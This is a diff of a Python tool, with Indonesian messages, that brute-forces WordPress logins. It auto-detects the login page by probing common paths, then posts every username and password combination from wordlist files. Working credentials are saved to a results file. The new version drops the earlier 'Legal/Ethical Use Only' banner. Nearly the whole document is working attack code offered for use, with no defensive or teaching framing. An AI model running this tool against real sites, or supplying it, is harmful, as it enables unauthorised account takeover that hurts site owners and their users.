@@ -1,112 +1,136 @@
 import requests
-from concurrent.futures import ThreadPoolExecutor
 import time
-import os
+from concurrent.futures import ThreadPoolExecutor
 from colorama import Fore, Style, init
 
-# Inisialisasi colorama untuk warna terminal
+# Initialize colorama
 init(autoreset=True)
 
-# Fungsi untuk mencoba login WordPress
-def try_wp_login(url, username, password):
-    login_url = f"{url}/wp-login.php"
-    admin_url = f"{url}/wp-admin/"
+# Configuration
+USERNAME_FILE = "username.txt"
+PASSWORD_FILE = "password.txt"
+SAVE_FILE = "urlsave.txt"
+MAX_THREADS = 15
+TIMEOUT = 7
+
+# Common WordPress login paths (ordered by probability)
+WP_LOGIN_PATHS = [
+    "/wp-login.php",
+    "/wp-admin",
+    "/login",
+    "/admin",
+    "/dashboard",
+    "/wordpress/wp-login.php",
+    "/wp/wp-login.php",
+    "/cms/wp-login.php",
+    "/blog/wp-login.php"
+]
+
+def clear_screen():
+    """Clear terminal screen"""
+    print("\033c", end="")
+
+def detect_wp_login(base_url):
+    """Intelligent WordPress login page detection"""
+    for path in WP_LOGIN_PATHS:
+        test_url = f"{base_url.rstrip('/')}{path}"
+        try:
+            response = requests.head(test_url, timeout=TIMEOUT, allow_redirects=True)
+            
+            # Check for WordPress indicators
+            if response.status_code == 200:
+                final_url = response.url.lower()
+                if any(x in final_url for x in ["wp-login", "wp-admin", "login"]):
+                    return response.url
+                
+                # Additional check for WordPress content
+                if "wp-content" in requests.get(test_url, timeout=TIMEOUT).text.lower():
+                    return test_url
+                    
+        except requests.RequestException:
+            continue
     
-    # Data payload untuk WordPress
-    data = {
-        "log": username,
-        "pwd": password,
-        "wp-submit": "Log In",
-        "redirect_to": admin_url
-    }
-    
-    headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
-    }
-    
+    return None
+
+def brute_force(target, username, password):
+    """WordPress login brute force"""
     try:
         session = requests.Session()
-        response = session.post(login_url, data=data, headers=headers, timeout=10)
+        response = session.post(
+            target,
+            data={
+                "log": username,
+                "pwd": password,
+                "wp-submit": "Log In",
+                "redirect_to": target.replace("wp-login.php", "wp-admin/")
+            },
+            timeout=TIMEOUT,
+            allow_redirects=False
+        )
         
-        # Cek apakah login berhasil (redirect ke wp-admin)
-        if any("wp-admin" in r.url for r in response.history) or "wp-admin" in response.url:
+        # Success detection (302 redirect to wp-admin)
+        if response.status_code == 302 and "wp-admin" in response.headers.get('Location', ''):
             with open(SAVE_FILE, "a") as f:
-                f.write(f"[SUCCESS] {url} | {username}:{password}\n")
-            print(f"{Fore.GREEN}[+] SUCCESS: {url} | {username}:{password}{Style.RESET_ALL}")
+                f.write(f"{target}|{username}:{password}\n")
+            print(f"[ {Fore.GREEN}success{Style.RESET_ALL} ] {target} {username}:{password}")
             return True
         else:
-            print(f"{Fore.RED}[-] FAILED: {url} | {username}:{password}{Style.RESET_ALL}")
+            print(f"[ {Fore.RED}gagal{Style.RESET_ALL} ] {target} {username}:{password}")
             return False
-    except Exception as e:
-        print(f"{Fore.YELLOW}[!] ERROR on {url}: {e}{Style.RESET_ALL}")
+            
+    except Exception:
+        print(f"[ {Fore.RED}error{Style.RESET_ALL} ] {target} (connection failed)")
         return False
 
-# Baca wordlist dari file
-def load_wordlist(filename):
-    try:
-        with open(filename, "r") as f:
-            return [line.strip() for line in f if line.strip()]
-    except FileNotFoundError:
-        print(f"{Fore.RED}[!] File {filename} tidak ditemukan!{Style.RESET_ALL}")
-        return []
-
-# Proses brute-force untuk satu URL
-def brute_force_wp(url, usernames, passwords):
-    print(f"\n{Fore.CYAN}[*] Memulai brute-force pada: {url}{Style.RESET_ALL}")
-    success_count = 0
-    
-    with ThreadPoolExecutor(max_workers=10) as executor:
-        for username in usernames:
-            for password in passwords:
-                if try_wp_login(url, username, password):
-                    success_count += 1
-    
-    print(f"{Fore.CYAN}[*] Selesai! Login berhasil di {url}: {success_count}{Style.RESET_ALL}")
-
-# Main program
 def main():
-    global SAVE_FILE
+    clear_screen()
+    print(f"\n{Fore.GREEN}=== WordPress Brute Force Tool ==={Style.RESET_ALL}\n")
     
-    print(f"""
-    {Fore.BLUE}[+] WordPress Brute-Force Tool (Legal/Ethical Use Only!){Style.RESET_ALL}
-    """)
+    # Get target URL
+    base_url = input("Masukkan URL target: ").strip()
+    if not base_url.startswith(('http://', 'https://')):
+        base_url = f"http://{base_url}"
     
-    # Input file URL target
-    url_file = input("Masukkan file daftar URL (contoh: urlnow.txt): ").strip()
-    if not os.path.exists(url_file):
-        print(f"{Fore.RED}[!] File {url_file} tidak ditemukan!{Style.RESET_ALL}")
+    # Auto-detect login page
+    print("\n[ * ] Mencari halaman login WordPress...")
+    login_url = detect_wp_login(base_url)
+    
+    if not login_url:
+        print(f"\n[ {Fore.RED}gagal{Style.RESET_ALL} ] Tidak dapat menemukan halaman login WordPress")
         return
     
-    # Input file username & password
-    username_file = input("Masukkan file username (default: username.txt): ").strip() or "username.txt"
-    password_file = input("Masukkan file password (default: password.txt): ").strip() or "password.txt"
+    print(f"[ {Fore.GREEN}found{Style.RESET_ALL} ] Login URL: {login_url}")
     
-    SAVE_FILE = input("Masukkan file untuk menyimpan hasil (default: save.txt): ").strip() or "save.txt"
-    
-    # Load semua wordlist
-    urls = load_wordlist(url_file)
-    usernames = load_wordlist(username_file)
-    passwords = load_wordlist(password_file)
-    
-    if not urls or not usernames or not passwords:
-        print(f"{Fore.RED}[!] Error: File URL/username/password kosong atau tidak ditemukan!{Style.RESET_ALL}")
+    # Load credentials
+    try:
+        usernames = [u.strip() for u in open(USERNAME_FILE).readlines() if u.strip()]
+        passwords = [p.strip() for p in open(PASSWORD_FILE).readlines() if p.strip()]
+    except FileNotFoundError:
+        print(f"\n[ {Fore.RED}error{Style.RESET_ALL} ] File username.txt atau password.txt tidak ditemukan")
         return
     
-    print(f"\n{Fore.BLUE}[*] Target URL: {len(urls)}")
-    print(f"[*] Username list: {len(usernames)}")
-    print(f"[*] Password list: {len(passwords)}")
-    print(f"[*] Hasil akan disimpan di: {SAVE_FILE}{Style.RESET_ALL}")
-    
-    input("\nTekan Enter untuk memulai brute-force...")
+    print(f"[ * ] Memulai brute force dengan {len(usernames)} username dan {len(passwords)} password\n")
     
     start_time = time.time()
+    success_count = 0
     
-    # Proses setiap URL
-    for url in urls:
-        brute_force_wp(url, usernames, passwords)
+    # Start brute forcing
+    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
+        for username in usernames:
+            for password in passwords:
+                if brute_force(login_url, username, password):
+                    success_count += 1
     
-    elapsed_time = time.time() - start_time
-    print(f"\n{Fore.GREEN}[+] Total waktu eksekusi: {elapsed_time:.2f} detik{Style.RESET_ALL}")
+    # Show results
+    elapsed = time.time() - start_time
+    print(f"\n[ * ] Selesai dalam {elapsed:.2f} detik")
+    
+    if success_count == 0:
+        print(f"\n[ {Fore.RED}result{Style.RESET_ALL} ] Anda tidak mendapatkan [ hasil 0 ]")
+    else:
+        print(f"\n[ {Fore.GREEN}result{Style.RESET_ALL} ] Selamat anda success [ hasil {success_count} ]")
+    
+    print(f"[ * ] Hasil disimpan di {SAVE_FILE}")
 
 if __name__ == "__main__":
     main()
